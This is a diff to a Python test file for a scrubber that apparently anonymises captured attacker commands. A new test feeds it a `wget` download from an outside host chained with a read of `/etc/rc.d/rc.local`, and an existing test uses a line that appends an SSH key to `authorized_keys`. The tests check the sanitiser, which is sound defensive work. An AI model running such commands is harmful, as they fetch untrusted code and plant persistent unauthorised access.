@@ -243,6 +243,14 @@ def test_public_domains_are_replaced_but_file_names_are_not():
     assert re.search(r"u@files\.host\d+\.example\.net:/in", scrubbed) and scrubbed.endswith("cat run.sh")
 
 
+def test_a_host_before_a_path_is_replaced_whatever_its_tld():
+    """Found in real traffic: `wget host.es/x` has no scheme and a TLD that is
+    also a word, so neither the URL rule nor the TLD list caught it."""
+    scrubbed = captures.scrub("wget files.mirror-host.es/tool && cat /etc/rc.d/rc.local")
+    assert "mirror-host.es" not in scrubbed and re.search(r"files\.host\d+\.example\.net/tool", scrubbed)
+    assert scrubbed.endswith("cat /etc/rc.d/rc.local")
+
+
 def test_keys_and_long_payloads_are_cut_short():
     key = "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGxvbmdrZXltYXRlcmlhbGhlcmU op@box' >> ~/.ssh/authorized_keys"
     assert "ssh-ed25519 AAAA_REDACTED op@box" in captures.scrub(key)
